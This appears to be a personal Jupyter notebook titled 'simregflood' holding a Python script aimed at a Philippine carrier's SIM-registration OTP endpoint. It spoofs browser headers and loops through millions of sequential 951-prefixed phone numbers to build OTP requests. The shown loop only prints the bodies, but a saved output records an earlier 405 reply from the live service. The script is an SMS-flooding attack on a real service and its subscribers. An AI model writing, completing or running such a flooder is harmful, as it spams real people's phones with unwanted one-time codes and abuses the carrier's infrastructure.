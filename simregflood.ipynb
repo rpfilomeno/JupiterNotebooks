{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPV17zs+6yGYf3+5WWLK5xm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/rpfilomeno/JupiterNotebooks/blob/main/simregflood.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 39,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "QNrza_6jPWE0",
        "outputId": "db9d8405-7f6e-4549-8d16-641d8e95167d"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Status Code: 405, Response: {'statusCode': 405, 'message': 'Method Not Allowed'}\n"
          ]
        }
      ],
      "source": [
        "import requests\n",
        "import json\n",
        "\n",
        "headers = {\n",
        "  \"authority\":\"simreg.smart.com.ph\",\n",
        "   \"method\":\"POST\",\n",
        "   \"path\":\"/api/otp/sendOTP\",\n",
        "   \"scheme\":\"https\",\n",
        "   \"accept\":\"*/*\",\n",
        "   \"accept-encoding\":\"gzip, deflate, br\",\n",
        "   \"accept-language\":\"en-US,en;q=0.9\",\n",
        "   \"cache-control\":\"no-cache\",\n",
        "   \"dnt\":\"1\",\n",
        "   \"origin\":\"https://simreg.smart.com.ph\",\n",
        "   \"pragma\":\"no-cache\",\n",
        "   \"referer\":\"https://simreg.smart.com.ph/\",\n",
        "   \"sec-ch-ua\":\"\\\"Not?A_Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"108\\\", \\\"Google Chrome\\\";v=\\\"108\\\"\",\n",
        "   \"sec-ch-ua-mobile\":\"?0\",\n",
        "   \"sec-ch-ua-platform\":\"\\\"Windows\\\"\",\n",
        "   \"sec-fetch-dest\":\"empty\",\n",
        "   \"sec-fetch-mode\":\"cors\",\n",
        "   \"sec-fetch-site\":\"same-origin\"\n",
        "}\n",
        "\n",
        "url=\"https://simreg.smart.com.ph/api/otp/sendOTP\"\n",
        "#url='https://httpbin.org/post'\n",
        "\n",
        "for i in range(9999999):\n",
        "\n",
        "  body= {\"mobileNumber\": \"951\"+str(i).zfill(7)}\n",
        "  print (\"sending to \" + json.dumps(body))\n"
      ]
    }
  ]
}